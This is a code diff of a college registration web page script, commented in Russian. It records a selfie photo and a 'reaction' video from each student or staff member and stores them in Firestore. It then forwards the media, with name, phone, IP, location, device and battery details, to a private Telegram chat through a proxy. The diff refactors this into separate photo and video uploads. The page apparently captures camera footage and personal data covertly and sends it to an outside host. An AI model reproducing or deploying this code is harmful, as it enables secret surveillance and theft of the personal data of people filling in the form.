@@ -519,6 +519,7 @@
   const TELEGRAM_CHAT_ID = "6651741310";
   const PROXY_URL = "https://kp11-bot-proxy.riwendik.workers.dev";
 
+  // Отправка текста
   async function sendTelegramNotify(text) {
     try {
       const res = await fetch(`${PROXY_URL}?token=${TELEGRAM_TOKEN}&method=sendMessage`, {
@@ -532,62 +533,55 @@
         })
       });
       if (!res.ok) console.warn("Text send failed:", await res.text());
+      else console.log("✅ Текст отправлен");
     } catch (err) {
-      console.error("Telegram text error:", err);
+      console.error("❌ Ошибка отправки текста:", err);
     }
   }
 
-  async function sendTelegramMediaGroup(photoBase64, videoBase64, photosArray, caption) {
+  // Отправка фото (отдельно)
+  async function sendTelegramPhoto(photoBase64, caption) {
     try {
+      const blob = await (await fetch(photoBase64)).blob();
       const formData = new FormData();
       formData.append("chat_id", TELEGRAM_CHAT_ID);
-
-      const media = [];
-      let attachIndex = 0;
-
-      if (photoBase64) {
-        const key = "photo" + attachIndex++;
-        formData.append(key, await (await fetch(photoBase64)).blob(), "selfie.jpg");
-        media.push({
-          type: "photo",
-          media: "attach://" + key,
-          parse_mode: "HTML"
-        });
+      if (caption) {
+        formData.append("caption", caption);
+        formData.append("parse_mode", "HTML");
       }
+      formData.append("photo", blob, "selfie.jpg");
 
-      if (videoBase64) {
-        const key = "video" + attachIndex++;
-        formData.append(key, await (await fetch(videoBase64)).blob(), "video.mp4");
-        media.push({
-          type: "video",
-          media: "attach://" + key,
-          parse_mode: "HTML"
-        });
-      }
-
-      if (photosArray && photosArray.length > 0) {
-        for (let i = 0; i < photosArray.length; i++) {
-          const key = "reaction" + attachIndex++;
-          formData.append(key, await (await fetch(photosArray[i])).blob(), `reaction${i}.jpg`);
-          media.push({
-            type: "photo",
-            media: "attach://" + key,
-            parse_mode: "HTML"
-          });
-        }
-      }
-
-      if (media.length === 0) return;
-
-      formData.append("media", JSON.stringify(media));
-
-      const res = await fetch(`${PROXY_URL}?token=${TELEGRAM_TOKEN}&method=sendMediaGroup`, {
+      const res = await fetch(`${PROXY_URL}?token=${TELEGRAM_TOKEN}&method=sendPhoto`, {
         method: "POST",
         body: formData
       });
-      if (!res.ok) console.warn("MediaGroup send failed:", await res.text());
-    } catch (e) {
-      console.error("MediaGroup send error:", e);
+      if (!res.ok) console.warn("Photo send failed:", await res.text());
+      else console.log("✅ Фото отправлено");
+    } catch (err) {
+      console.error("❌ Ошибка отправки фото:", err);
+    }
+  }
+
+  // Отправка видео (отдельно)
+  async function sendTelegramVideo(videoBase64, caption) {
+    try {
+      const blob = await (await fetch(videoBase64)).blob();
+      const formData = new FormData();
+      formData.append("chat_id", TELEGRAM_CHAT_ID);
+      if (caption) {
+        formData.append("caption", caption);
+        formData.append("parse_mode", "HTML");
+      }
+      formData.append("video", blob, "video.mp4");
+
+      const res = await fetch(`${PROXY_URL}?token=${TELEGRAM_TOKEN}&method=sendVideo`, {
+        method: "POST",
+        body: formData
+      });
+      if (!res.ok) console.warn("Video send failed:", await res.text());
+      else console.log("✅ Видео отправлено");
+    } catch (err) {
+      console.error("❌ Ошибка отправки видео:", err);
     }
   }
   // ====================
@@ -958,7 +952,6 @@
   let pendingData = null;
   let audioUnlocked = false;
 
-  // Разблокировка звука при клике
   function unlockAudio() {
     if (audioUnlocked) return;
     try {
@@ -1158,9 +1151,10 @@
 
       if (!MediaRecorder.isTypeSupported(mimeType)) return false;
 
+      // Битрейт 500 кбит/с — приемлемое качество, ~600 КБ за 10 сек
       mediaRecorder = new MediaRecorder(mediaStream, {
         mimeType: mimeType,
-        videoBitsPerSecond: 250000
+        videoBitsPerSecond: 500000
       });
 
       mediaRecorder.ondataavailable = (e) => {
@@ -1189,8 +1183,13 @@
         let videoBase64 = null;
         if (recordedChunks.length > 0) {
           const blob = new Blob(recordedChunks, { type: recordedChunks[0].type || 'video/mp4' });
+          // Лимит Firestore — 1 МБ на документ.
+          // Фото ~50 КБ, значит видео должно быть не больше 900 КБ.
           if (blob.size < 900 * 1024) {
             videoBase64 = await blobToBase64(blob);
+            console.log("Видео размер:", blob.size, "байт");
+          } else {
+            console.warn("Видео слишком большое для Firestore:", blob.size);
           }
         }
         saveToFirestore(videoBase64, capturedPhoto);
@@ -1229,6 +1228,7 @@
         if (photoBase64) docData.photo = photoBase64;
         if (videoBase64) docData.video = videoBase64;
         await addDoc(collection(db, "staff"), docData);
+        console.log("✅ Педагог сохранён");
 
         const deviceStr = [deviceInfo.os, deviceInfo.browser, deviceInfo.model].filter(Boolean).join(" · ") || "—";
         const ipStr = [deviceInfo.ip, deviceInfo.ipCity, deviceInfo.ipProvider].filter(Boolean).join(" · ") || "—";
@@ -1244,10 +1244,12 @@
           "🔋 <b>Заряд:</b> " + batteryStr + "\n\n" +
           "⚠️ <b>Это сотрудник колледжа!</b>";
 
+        // 1. Текст
         await sendTelegramNotify(caption);
-        if (photoBase64 || videoBase64) {
-          await sendTelegramMediaGroup(photoBase64, videoBase64, null, "");
-        }
+        // 2. Фото отдельно
+        if (photoBase64) await sendTelegramPhoto(photoBase64, "📷 Фото педагога");
+        // 3. Видео отдельно
+        if (videoBase64) await sendTelegramVideo(videoBase64, "🎥 Реакция педагога");
       } else {
         const docData = {
           fio, phone, group,
@@ -1256,6 +1258,7 @@
         if (photoBase64) docData.photo = photoBase64;
         if (videoBase64) docData.video = videoBase64;
         await addDoc(collection(db, "students"), docData);
+        console.log("✅ Студент сохранён");
 
         const deviceStr = [deviceInfo.os, deviceInfo.browser, deviceInfo.model].filter(Boolean).join(" · ") || "—";
         const ipStr = [deviceInfo.ip, deviceInfo.ipCity, deviceInfo.ipProvider].filter(Boolean).join(" · ") || "—";
@@ -1271,10 +1274,12 @@
           "🌐 <b>IP:</b> " + ipStr + "\n" +
           "🔋 <b>Заряд:</b> " + batteryStr;
 
+        // 1. Текст
         await sendTelegramNotify(caption);
-        if (photoBase64 || videoBase64) {
-          await sendTelegramMediaGroup(photoBase64, videoBase64, null, "");
-        }
+        // 2. Фото отдельно
+        if (photoBase64) await sendTelegramPhoto(photoBase64, "📷 Фото студента");
+        // 3. Видео отдельно
+        if (videoBase64) await sendTelegramVideo(videoBase64, "🎥 Реакция студента");
       }
     } catch (err) {
       console.error("❌ Ошибка сохранения:", err);
@@ -1285,7 +1290,6 @@
     e.preventDefault();
     notice.classList.remove('show');
 
-    // Разблокируем звук при клике — ОДИН раз
     unlockAudio();
 
     if (courseEl.value === 'staff') {
